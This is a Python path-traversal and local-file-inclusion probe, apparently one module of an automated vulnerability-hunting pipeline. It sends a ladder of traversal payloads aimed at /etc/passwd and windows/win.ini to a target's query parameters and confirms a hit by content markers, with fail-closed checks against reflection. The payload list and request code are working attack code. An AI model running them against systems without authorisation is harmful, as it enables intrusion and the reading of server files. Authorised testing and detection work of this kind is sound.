#!/usr/bin/env python3
"""Generic path-traversal / local-file-inclusion probe for an UNKNOWN query sink.

Rule #66: the one loop hunts targets it has never seen — this probe
takes the sink spec from its marker argv (the loop encodes it there so
_probe_cmd needs no changes):

    MARKER = PLOOP66|<target_base>|<path>|GET|<p1,p2>

A path-traversal claim needs the TARGET's server to resolve attacker
"../" sequences in a query param and READ a file outside the web root.
The probe proves this per param through a CONTENT channel:

  GET path?<p>=../../../../etc/passwd (and a variant ladder:
  URL-encoded ..%2f, nested ....//....//, absolute /etc/passwd,
  Windows ..\\..\\..\\windows\\win.ini and ..%5c variants).

The probe NEVER transmits the file-content markers it looks for:
  - "root:x:0:0" (the /etc/passwd content marker) -> via=trav-passwd
  - "[fonts]" (the win.ini content marker)       -> via=trav-winini

CONFIRM only when the response body contains a content marker that was
never in the request. A verbatim echo of the payload ("etc/passwd"
visible, marker absent) is reflection -> FAILED (the hard negative
control). If the BENIGN baseline already contains a marker (a static
page that happens to quote it), the probe fails closed — a claim must
never rest on a marker the app serves to everyone.

Fail-closed rules (the probe lesson, 29 Oct):
  - The control request can never confirm (benign value, no payload).
  - Marker present in the benign baseline -> VERDICT: FAILED.
  - Reflected payload without a content marker -> FAILED
    (reflection, not file read).
  - Errors, timeouts, empty bodies -> FAILED.
  - No marker in any payload response -> VERDICT: FAILED.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED. The
probe never fetches anything external; it only asks the TARGET for
URLs the loop's own scope gate already allowed.
"""
import http.client
import sys
import time
import urllib.parse

REQ_TIMEOUT = 15
_BENIGN = "ploop66-benign"
# Content markers: NEVER transmitted in any request. Only a server-side
# file read can explain their presence in a response body.
_PASSWD_MARKER = "root:x:0:0"
_WININI_MARKER = "[fonts]"
# Payload ladder: unix traversal, encoded, nested-bypass, absolute,
# windows backslash, windows encoded.
_PAYLOADS = [
    ("../../../../etc/passwd", "trav-passwd"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "trav-passwd"),
    ("....//....//....//....//etc/passwd", "trav-passwd"),
    ("/etc/passwd", "trav-passwd"),
    ("..\\..\\..\\windows\\win.ini", "trav-winini"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "trav-winini"),
]
_PAYLOAD_ECHO_HINTS = ("etc/passwd", "etc%2fpasswd", "win.ini",
                       "windows%5cwin")


def _get(tb, path, params):
    """GET without following redirects. Returns (code, body, rtt)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    q = urllib.parse.urlencode(params)
    target = pu.path + ("?" + q if q else "")
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=REQ_TIMEOUT)
    try:
        t0 = time.monotonic()
        conn.request("GET", target,
                     headers={"User-Agent": "PLOOP66",
                              "Host": pu.netloc})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        rtt = time.monotonic() - t0
        return resp.status, body, rtt
    finally:
        conn.close()


def _probe_param(tb, path, param):
    """Probe one param. Returns (verdict, via, detail)."""
    # 1. Control: benign GET must answer.
    try:
        _code, base_body, _rtt = _get(tb, path, {param: _BENIGN})
    except Exception as exc:
        return "FAILED", None, "control errored: %s" % exc
    if not base_body:
        return "FAILED", None, "control empty body (fail-closed)"
    # Fail closed when the app serves a content marker to everyone:
    # a claim could then never distinguish a real file read.
    for marker, via in ((_PASSWD_MARKER, "trav-passwd"),
                        (_WININI_MARKER, "trav-winini")):
        if marker in base_body:
            return ("FAILED", None,
                    "fail-closed: %s marker present in the benign "
                    "baseline" % via)
    # 2. Payload ladder.
    for payload, via in _PAYLOADS:
        marker = (_PASSWD_MARKER if via == "trav-passwd"
                  else _WININI_MARKER)
        try:
            code, body, _rtt = _get(tb, path, {param: payload})
        except Exception:
            continue  # one dead payload never aborts the ladder
        if marker in body:
            return ("CONFIRMED", via,
                    "body contains the %s content marker, which was "
                    "never transmitted" % via)
        # Verbatim echo without the marker is reflection, not a file
        # read — note it and keep climbing (it can never confirm).
    return "FAILED", None, "no content marker in any payload response"


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP66"
    try:
        _, tb_q, path_q, method, params_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    params = [p for p in params_csv.split(",") if p]
    method = (method or "GET").upper()
    if not tb or not path.startswith("/") or not params or \
            method != "GET":
        print("PROBE_ERROR invalid sink spec "
              "(path traversal needs a GET query sink)")
        print("VERDICT: FAILED")
        return
    print("EVIDENCE sink=%s marker=%s params=%s" % (path, marker,
                                                   ",".join(params)))
    for param in params:
        verdict, via, detail = _probe_param(tb, path, param)
        print("param=%s verdict=%s via=%s detail=%s" % (
            param, verdict, via, detail))
        if verdict == "CONFIRMED":
            # Rule #73: print the observed content snippet so the
            # pipeline's cmd-exec signal (/root:/) fires on a genuine
            # file read. The marker was observed in the response body
            # (fail-closed: CONFIRMED only when marker in body).
            content = (_PASSWD_MARKER if via == "trav-passwd"
                       else _WININI_MARKER)
            print("EVIDENCE sink=%s param=%s via=%s content=%s"
                  % (path, param, via, content))
            print("VERDICT: CONFIRMED")
            return
    print("VERDICT: FAILED")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print("PROBE_ERROR: %s" % exc)
        print("VERDICT: FAILED")
